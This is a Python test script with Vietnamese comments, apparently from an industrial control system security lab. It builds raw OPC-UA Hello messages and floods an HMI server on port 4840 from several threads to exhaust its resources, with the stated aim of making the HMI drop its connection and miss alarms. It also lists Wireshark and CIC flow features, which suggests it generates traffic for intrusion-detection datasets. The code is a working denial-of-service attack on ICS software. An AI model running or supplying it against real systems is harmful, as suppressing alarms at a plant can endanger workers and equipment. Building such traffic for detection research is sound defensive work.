#!/usr/bin/env python3
"""
tests/test_hmi_alarm.py
HMI_ALARM_SUPPRESS — Giả lập xóa subscription bằng cách flood
OPC-UA Hello rồi disconnect ngay (server phải cleanup resources).
Dùng raw socket vì server không cho phép full session.

Chạy: python tests/test_hmi_alarm.py
"""

import sys
import os
import socket
import struct
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

FLOOD_COUNT = 50
THREADS = 5
DURATION = 15


def build_hello(host, port):
    endpoint = f"opc.tcp://{host}:{port}".encode()
    ep_len = len(endpoint)
    msg_size = 28 + ep_len
    return (
        b'HEL' + b'F' +
        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
        struct.pack('<I', ep_len) + endpoint
    )


def alarm_suppress_worker(host, port, hello, results, lock):
    """Flood OPC-UA connections — server tốn resource handle/close."""
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(hello)
            time.sleep(0.05)
            s.close()
            with lock:
                results["success"] += 1
        except Exception:
            with lock:
                results["failed"] += 1


def main():
    host = HMI_IP
    port = 4840

    print(f"\n{B}[TEST] HMI_ALARM_SUPPRESS (OPC-UA Resource Exhaust){X}")
    info(f"Target: {host}:{port}")
    info(f"Threads: {THREADS} | Duration: {DURATION}s")
    info("Flood OPC-UA Hello -> server phai xu ly -> resource exhaust")
    info("Khi server qua tai -> HMI that mat ket noi -> mat alarm")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    hello = build_hello(host, port)
    results = {"success": 0, "failed": 0}
    lock = threading.Lock()

    try:
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=alarm_suppress_worker,
                                 args=(host, port, hello, results, lock))
            t.daemon = True
            threads.append(t)
            t.start()

        # Monitor
        for sec in range(DURATION):
            time.sleep(1)
            if (sec + 1) % 5 == 0:
                info(f"  [{sec+1:2d}s] sent={results['success']} failed={results['failed']}")

        for t in threads:
            t.join(timeout=3)

        observable.append(f"OPC-UA flood: {results['success']} connects trong {DURATION}s")
        observable.append(f"{THREADS} threads song song -> resource exhaustion")
        observable.append("Effect: HMI mat connection -> khong nhan alarm")
        notes.append(f"Total sent: {results['success']} | Failed: {results['failed']}")
        notes.append("Wireshark: tcp.port==4840 && frame.time_delta < 0.1")
        notes.append("CIC: Fwd Packets/s rat cao, Flow Duration ngan")

    except Exception as e:
        error = str(e)
        fail(str(e))

    success = results["success"] > 0
    print_result("HMI_ALARM_SUPPRESS", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
